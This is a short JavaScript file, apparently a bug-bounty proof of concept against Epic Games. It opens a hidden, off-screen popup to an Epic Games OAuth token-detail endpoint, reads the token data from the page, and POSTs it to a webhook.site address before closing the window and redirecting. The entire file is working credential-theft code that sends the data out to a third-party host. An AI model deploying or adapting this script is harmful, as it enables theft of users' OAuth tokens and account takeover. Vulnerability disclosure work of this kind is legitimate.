//CDN: https://cdn.jsdelivr.net/gh/Johnathanrs/FN_BB1@main/bug_working.js
//CDN: https://cdn.jsdelivr.net/gh/<username>/<repo_name>@<branch>/<file_name>

(function() {
  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail','_blank','toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', ''); 
  target.addEventListener('DOMContentLoaded', () => {
    var data = target.document.querySelectorAll('pre')[0].firstChild.data;
    const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
    async function a() {
      const resp = await fetch('https://webhook.site/1da67bcc-a46f-48c1-b171-9339305c7be0',{method:'POST',body:JSON.stringify(data), headers:headers})
      if (resp.ok) {
        target.close();
        window.location.href="https://content-service.bfda.live.use1a.on.epicgames.com";
      }
    }
    a();
    })
})();
